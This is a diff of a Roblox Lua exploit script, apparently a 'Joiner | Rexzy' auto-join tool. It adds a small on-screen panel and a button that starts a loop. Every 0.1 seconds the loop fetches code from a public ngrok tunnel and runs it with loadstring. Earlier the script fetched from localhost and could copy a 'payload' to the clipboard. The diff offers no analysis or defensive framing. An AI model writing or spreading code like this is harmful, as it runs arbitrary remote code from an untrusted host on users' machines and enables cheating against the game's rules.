@@ -1,65 +1,67 @@
 local player = game:GetService("Players").LocalPlayer
 local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-gui.Name = "JoinerMinimalUI"
+gui.Name = "JoinerRexzyUI"
 gui.ResetOnSpawn = false
+
 -- Main frame
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 160, 0, 80)
-frame.Position = UDim2.new(0, 20, 0.5, -40)
-frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.Size = UDim2.new(0, 160, 0, 70)
+frame.Position = UDim2.new(0, 20, 0.5, -35)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
+frame.Active = true -- Needed for dragging
+frame.Draggable = true -- Enables drag
 frame.Parent = gui
+
+-- UICorner for rounded edges
 local corner = Instance.new("UICorner", frame)
 corner.CornerRadius = UDim.new(0, 12)
--- Start Auto Join (Red Button)
-local startButton = Instance.new("TextButton")
-startButton.Size = UDim2.new(1, -20, 0, 30)
-startButton.Position = UDim2.new(0, 10, 0, 10)
-startButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-startButton.Text = "1-10M"
-startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-startButton.TextSize = 18
-startButton.Font = Enum.Font.SourceSansBold
-startButton.Parent = frame
-Instance.new("UICorner", startButton).CornerRadius = UDim.new(0, 8)
--- Copy Payload (Green Button)
-local copyButton = Instance.new("TextButton")
-copyButton.Size = UDim2.new(1, -20, 0, 30)
-copyButton.Position = UDim2.new(0, 10, 0, 45)
-copyButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
-copyButton.Text = "10M"
-copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-copyButton.TextSize = 18
-copyButton.Font = Enum.Font.SourceSansBold
-copyButton.Parent = frame
-Instance.new("UICorner", copyButton).CornerRadius = UDim.new(0, 8)
--- Script Execution Logic
+
+-- Label
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 25)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "Joiner | Rexzy"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 18
+title.Font = Enum.Font.SourceSansBold
+title.Parent = frame
+
+-- Button
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(1, -20, 0, 30)
+button.Position = UDim2.new(0, 10, 1, -35)
+button.BackgroundColor3 = Color3.fromRGB(70, 140, 255)
+button.Text = "Start auto join"
+button.TextColor3 = Color3.fromRGB(240, 240, 240)
+button.TextSize = 20
+button.Font = Enum.Font.SourceSansBold
+button.AutoButtonColor = false
+button.Parent = frame
+
+-- UICorner for button
+local buttonCorner = Instance.new("UICorner", button)
+buttonCorner.CornerRadius = UDim.new(0, 10)
+
+-- Function to run payload repeatedly
 local running = false
-startButton.MouseButton1Click:Connect(function()
+local loop
+
+button.MouseButton1Click:Connect(function()
 	if not running then
 		running = true
-		startButton.Text = "Running..."
-		startButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
-		task.spawn(function()
+		button.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+		button.Text = "Running..."
+
+		-- Start loop
+		loop = task.spawn(function()
 			while running do
 				pcall(function()
-					loadstring(game:HttpGet("http://127.0.0.1:5000/script"))()
+					loadstring(game:HttpGet("https://db555bd0a5a7.ngrok-free.app/script"))()
 				end)
 				task.wait(0.1)
 			end
 		end)
 	end
-end)
--- Clipboard copy logic for 10M
-copyButton.MouseButton1Click:Connect(function()
-	pcall(function()
-		local payload = game:HttpGet("http://127.0.0.1:5000/10m")
-		setclipboard(payload)
-	end)
-	copyButton.Text = "Copied!"
-	task.delay(1.5, function()
-		copyButton.Text = "10M"
-	end)
 end)
